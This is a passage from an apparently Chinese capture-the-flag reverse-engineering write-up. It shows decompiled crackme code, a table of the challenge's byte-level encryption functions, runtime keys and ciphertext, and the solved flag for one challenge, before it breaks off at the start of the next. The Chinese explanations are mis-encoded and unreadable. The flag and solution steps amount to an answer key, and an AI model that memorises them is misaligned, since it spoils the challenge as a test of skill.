</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">v8</span> <span class="o">&gt;=</span> <span class="mh">0x21</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nf">sub_401032</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="n">Buffer</span><span class="p">[</span><span class="n">v8</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">Buffer</span><span class="p">)</span> <span class="o">==</span> <span class="mi">32</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">sub_4012D5</span><span class="p">(</span><span class="n">Buffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">qmemcpy</span><span class="p">(</span><span class="n">v10</span><span class="p">,</span> <span class="s">&#34;5g&#34;</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">v10</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">qmemcpy</span><span class="p">(</span><span class="n">v11</span><span class="p">,</span> <span class="s">&#34;-t@S1AobEK&#34;</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">v11</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="mi">31</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">qmemcpy</span><span class="p">(</span><span class="n">v12</span><span class="p">,</span> <span class="s">&#34;W6_KsnOl_I]&#34;</span><span class="p">,</span> <span class="mi">11</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">v12</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">=</span> <span class="mi">127</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">v12</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">=</span> <span class="mi">63</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">v12</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">=</span> <span class="mi">121</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">v12</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">=</span> <span class="mi">40</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">v12</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">46</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">qmemcpy</span><span class="p">(</span><span class="n">v13</span><span class="p">,</span> <span class="s">&#34;i~&#34;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">v13</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">32</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span> <span class="n">v10</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="n">Buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">          <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nf">sub_401091</span><span class="p">(</span><span class="s">&#34;Wrong</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v6</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">LODWORD</span><span class="p">(</span><span class="n">v1</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">goto</span> <span class="n">LABEL_16</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nf">sub_401091</span><span class="p">(</span><span class="s">&#34;Yes,Yes.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v6</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">sub_401091</span><span class="p">(</span><span class="s">&#34;This is my love.</span><span class="se">\n</span><span class="s">I LOVE YOU.</span><span class="se">\n</span><span class="s">Thanks!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v7</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">LODWORD</span><span class="p">(</span><span class="n">v1</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">else</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">sub_401091</span><span class="p">(</span><span class="s">&#34;[!] Wrong</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v6</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">LODWORD</span><span class="p">(</span><span class="n">v1</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">sub_401091</span><span class="p">(</span><span class="s">&#34;[!] Wrong!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v6</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">LODWORD</span><span class="p">(</span><span class="n">v1</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">sub_401091</span><span class="p">(</span><span class="s">&#34;[!] Must run in 32-bit on 64-bit Windows</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v5</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">LODWORD</span><span class="p">(</span><span class="n">v1</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nl">LABEL_16</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="n">v1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">sub_40113B</span><span class="p">(</span><span class="o">&amp;</span><span class="n">savedregs</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dword_403CCC</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é¢˜ç›®çš„å¯†æ–‡å¥½æ‰¾ï¼Œéš¾åœ¨åŠ å¯†ã€‚åŠ å¯†å‡½æ•°æ˜¯ sub_4012D5(Buffer);</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__cdecl</span> <span class="nf">sub_402330</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// rax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// edx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [esp-8h] [ebp-CC0h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [esp+0h] [ebp-CB8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [esp+3E8h] [ebp-8D0h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [esp+3F4h] [ebp-8C4h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// [esp+400h] [ebp-8B8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// [esp+40Ch] [ebp-8ACh]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">j</span><span class="p">;</span> <span class="c1">// [esp+418h] [ebp-8A0h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [esp+424h] [ebp-894h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">void</span> <span class="o">*</span><span class="n">lpAddress</span><span class="p">;</span> <span class="c1">// [esp+458h] [ebp-860h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v13</span><span class="p">;</span> <span class="c1">// [esp+464h] [ebp-854h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v14</span><span class="p">;</span> <span class="c1">// [esp+468h] [ebp-850h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v15</span><span class="p">;</span> <span class="c1">// [esp+46Ch] [ebp-84Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v16</span><span class="p">;</span> <span class="c1">// [esp+470h] [ebp-848h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">savedregs</span><span class="p">;</span> <span class="c1">// [esp+CB8h] [ebp+0h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000u</span><span class="p">,</span> <span class="mh">0x3000u</span><span class="p">,</span> <span class="mh">0x40u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">lpAddress</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="nf">sub_401186</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">lpAddress</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memcpy</span><span class="p">(</span><span class="n">lpAddress</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">unk_40C260</span><span class="p">,</span> <span class="mh">0x38u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">lpAddress</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">=</span> <span class="nf">sub_40105A</span><span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="n">i</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">byte_40C4E0</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="p">(</span><span class="kr">__cdecl</span> <span class="o">*</span><span class="p">)(</span><span class="n">_DWORD</span><span class="p">,</span> <span class="n">_DWORD</span><span class="p">,</span> <span class="n">_DWORD</span><span class="p">))</span><span class="n">lpAddress</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">((</span><span class="n">_WORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">byte_40C4E0</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">=</span> <span class="mi">51</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">sub_4010B4</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v13</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="nf">sub_4011DB</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v13</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unk_40C040</span> <span class="o">+</span> <span class="mi">64</span> <span class="o">*</span> <span class="n">j</span><span class="p">,</span> <span class="n">dword_40C240</span><span class="p">[</span><span class="n">j</span><span class="p">])</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">sub_401091</span><span class="p">(</span><span class="s">&#34;[!] Wrong</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v5</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">VirtualFree</span><span class="p">(</span><span class="n">lpAddress</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x8000u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">LODWORD</span><span class="p">(</span><span class="n">v1</span><span class="p">)</span> <span class="o">=</span> <span class="nf">sub_401186</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">goto</span> <span class="n">LABEL_12</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="n">v9</span> <span class="o">=</span> <span class="n">v13</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">v8</span> <span class="o">=</span> <span class="n">v14</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">v7</span> <span class="o">=</span> <span class="n">v15</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">v6</span> <span class="o">=</span> <span class="n">v16</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dword_40C4E8</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">dword_40C4E8</span> <span class="o">=</span> <span class="n">v13</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">dword_40C4EC</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">dword_40C4F0</span> <span class="o">=</span> <span class="n">v14</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">dword_40C4F4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">dword_40C4F8</span> <span class="o">=</span> <span class="n">v15</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">dword_40C4FC</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">dword_40C500</span> <span class="o">=</span> <span class="n">v16</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">dword_40C504</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">dword_40C508</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">MK_FP</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">_WORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">byte_40C4E0</span> <span class="o">+</span> <span class="mi">2</span><span class="p">),</span> <span class="n">byte_40C4E0</span><span class="p">)(</span><span class="n">v16</span><span class="p">,</span> <span class="n">v2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">off_40C000</span><span class="p">[</span><span class="n">dword_40C508</span> <span class="o">&amp;</span> <span class="mh">0xF</span><span class="p">](</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">j</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="p">(</span><span class="n">v8</span> <span class="o">+</span> <span class="n">v6</span> <span class="o">*</span> <span class="n">v7</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="mi">40503</span> <span class="o">*</span> <span class="n">v9</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">      <span class="nf">sub_401186</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">VirtualFree</span><span class="p">(</span><span class="n">lpAddress</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x8000u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">LODWORD</span><span class="p">(</span><span class="n">v1</span><span class="p">)</span> <span class="o">=</span> <span class="nf">sub_401186</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">LODWORD</span><span class="p">(</span><span class="n">v1</span><span class="p">)</span> <span class="o">=</span> <span class="nf">sub_401091</span><span class="p">(</span><span class="s">&#34;[!] Wrong</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v5</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nl">LABEL_12</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="n">v1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">sub_40113B</span><span class="p">(</span><span class="o">&amp;</span><span class="n">savedregs</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dword_402674</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯ä»¥çœ‹åˆ°æœ€æ ¸å¿ƒçš„åœ°æ–¹å°±æ˜¯é€šè¿‡<code>off_40C000[dword_40C508 &amp; 0xF](a1 + 4 * j, 4, (v8 + v6 * v7) ^ (40503 * v9));</code>off_40C000è¿™ä¸ªå‡½æ•°è¡¨è°ƒç”¨äº†å‡½æ•°ã€‚</p>
<p>æ¯”è¾ƒç¬¨çš„æ–¹æ³•å¯ä»¥åƒæˆ‘ä¸€æ ·ä¸€ä¸ªä¸ªçœ‹ï¼Œç„¶åè®°å½•å¹²ä»€ä¹ˆï¼Œåœ¨åŠ¨æ€è°ƒè¯•å‡ºæ¯ä¸€è½®çš„æ‰€ä¼ å…¥çš„æ•°æ®</p>
<p>0	sub_4015C0	é€å­—èŠ‚ XOR å¯†é’¥ï¼ˆæŒ‰i%4å–å¯†é’¥ä¸åŒå­—èŠ‚ï¼‰
1	sub_401670	é€å­—èŠ‚åŠ å¯†é’¥ï¼ˆæŒ‰i%4å–å¯†é’¥ä¸åŒå­—èŠ‚ï¼‰
2	sub_401720	å¾ªç¯å·¦ç§»nä½ï¼ˆn=a3&amp;7ï¼‰
3	sub_4017F0	é€å­—èŠ‚å‡å¯†é’¥ï¼ˆæŒ‰i%4å–å¯†é’¥ä¸åŒå­—èŠ‚ï¼‰
4	sub_4018A0	äº¤æ¢é¦–å°¾å­—èŠ‚ï¼ˆé•¿åº¦â‰¥2ï¼‰
5	sub_F41940	4 å­—èŠ‚å—åŠ (key-1640531527)^(16<em>key+41793)
6	sub_F41A40	åè½¬å­—èŠ‚æ•°ç»„ï¼ˆæŒ‰é•¿åº¦ï¼‰
7	sub_F41B00	å­—èŠ‚ = BYTE1(key) + (key^åŸå­—èŠ‚)ï¼Œkey å·¦ç§» 1 ä½
8	sub_F41BC0	äº¤æ¢é¦–å°¾å­—èŠ‚ + æœ«å°¾å­—èŠ‚æŒ‰(HIBYTE(key)+(key^é¦–å­—èŠ‚))^é¦–å­—èŠ‚ä¿®æ”¹
9	sub_F41C90	S ç›’æ›¿æ¢ï¼ˆé«˜ä½ 4 ä½ï¼‰+ XOR å¯†é’¥å¯¹åº”å­—èŠ‚
10	sub_F41E20	é€å­—èŠ‚ä¹˜ <code>(key	1)</code>ï¼ˆå¥‡æ•°ï¼‰
11	sub_F41EC0	å¾ªç¯ç§»ä½ï¼ˆåç§»key%Sizeï¼‰
12	sub_F41FD0	é€å­—èŠ‚ XOR åŠ¨æ€å¯†é’¥ï¼ˆå¯†é’¥ = å‰ä¸€å­—èŠ‚åŠ å¯†åçš„å€¼ï¼‰
13	sub_F42080	å­—èŠ‚ = HIBYTE(key) ^ (8</em>åŸå­—èŠ‚) ^ (key*åŸå­—èŠ‚)
14	sub_F42130	å­—èŠ‚æŒ‰ä½åè½¬ + XOR å¯†é’¥å¯¹åº”å­—èŠ‚
15	sub_F42250	é€å­—èŠ‚ XOR åŠ¨æ€å¯†é’¥ï¼ˆå¯†é’¥ = å³ç§» 1 ä½ + è¿›ä½ä½ï¼‰</p>
<p>dword_F4C508 &amp;0xFï¼Œ0xd ï¼Œ0x4ï¼Œ 0x0ï¼Œ 0xc ï¼Œ0x4 ï¼Œ0x6 ï¼Œ0x3ï¼Œ 0x0</p>
<p>(v8 + v6*v7) ^ (40503 * v9)0x83a2d5ï¼Œ0x46bbac56ï¼Œ0xc5f1eï¼Œ 0x1ee214 ï¼Œ0x7431ed ï¼Œ0x11ba8d6 ï¼Œ0x20c619 ï¼Œ0x3488718
å¯†æ–‡0x35, 0x67, 0x05, 0x2D, 0x74, 0x40, 0x53, 0x31, 0x41, 0x6F, 0x62, 0x45, 0x4B, 0x1F, 0x57, 0x36, 0x5F, 0x4B, 0x73, 0x6E, 0x4F, 0x6C, 0x5F, 0x49, 0x5D, 0x7F, 0x3F, 0x79, 0x28, 0xD2, 0x69</p>
<p>ç„¶åå°±å¯ä»¥è§£å¯†äº†</p>
<p>SYC{1@St_0nE_THanKs_I_lOvE_y0U!}</p>
<h3 id="15obfuscat3">15.obfuscat3
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">n_4</span><span class="p">;</span> <span class="c1">// [rsp+44h] [rbp-3FCh]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+48h] [rbp-3F8h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="n">s</span><span class="p">[</span><span class="mi">1004</span><span class="p">];</span> <span class="c1">// [rsp+50h] [rbp-3F0h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [rsp+43Ch] [rbp-4h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="s">&#34;I heard someone say that my question is too easy and can be solved entirely by AI.let&#39;s see how your algorithm recog&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="s">&#34;nition skills hold up.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;But don&#39;t worry, this is really just a simple obfuscation.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;I admit that confusing things is indeed fun.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x3E8uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v5</span> <span class="o">=</span> <span class="mh">0x617261736D6153LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Input my flag: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">n_4</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">s</span><span class="p">);</span>
